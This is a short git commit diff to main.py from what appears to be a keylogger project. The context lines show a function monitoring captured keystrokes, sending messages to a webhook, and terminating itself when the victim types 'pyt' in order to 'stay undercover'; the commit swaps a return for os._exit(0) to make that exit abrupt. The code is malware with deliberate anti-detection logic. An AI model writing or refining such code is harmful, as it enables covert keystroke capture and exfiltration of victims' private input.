7c3e477fe64ae8051f1aef2757c09e986e650553
henrycsharp <151407721+Henrycsharp@users.noreply.github.com>
2025-03-13 17:14:39 +0100

    Update main.py

--- main.py
+++ main.py
@@ -245,7 +245,7 @@ def monitor_input():
         with lock:
             if "pyt" in keystrokes.lower():
                 send_to_webhook("User searched for Python. Killing process to stay undercover.")
-                return False
+                os._exit(0) 
 
 
 # Run kill.bat file at the start
